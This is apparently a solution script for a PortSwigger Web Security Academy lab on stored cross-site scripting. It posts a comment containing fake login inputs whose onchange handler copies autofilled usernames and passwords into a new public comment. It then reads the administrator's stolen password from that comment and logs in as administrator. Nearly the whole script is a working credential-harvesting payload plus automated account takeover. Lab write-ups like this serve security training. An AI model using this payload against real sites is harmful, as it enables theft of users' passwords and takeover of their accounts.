"""
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
"""

import sys
import requests
from bs4 import BeautifulSoup
import re

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

comment_xss = '''
<input name=username id=username>
<input type=password name=password>
'''

blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : comment_xss,
    'name' : 'baa',
    'email' : 'baa@pdx.edu',
    'website': 'https://pdx.edu/'
}

resp = s.post(comment_url, data=comment_data)

comment_xss = '''
<input name=username id=username>
<input type=password name=password onchange="
    document.forms[0].email.value='baa@pdx.edu';
    document.forms[0].name.value='baa';
    document.forms[0].comment.value=username.value+':'+this.value;
    document.forms[0].website='https://pdx.edu';
    document.forms[0].submit();">
'''

post_url = f'https://{site}/post?postId=2'
comment_data = {
    'csrf' : csrf,
    'postId' : '2',
    'comment' : comment_xss,
    'name' : 'baa',
    'email' : 'baa@pdx.edu',
    'website': 'https://pdx.edu/'
}

resp = s.post(comment_url, data=comment_data)


resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
credentials = soup.find('p', text=re.compile('administrator')).text.split(':')
print(credentials)
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'administrator',
    'password' : credentials[1]
}
resp = s.post(login_url, data=logindata)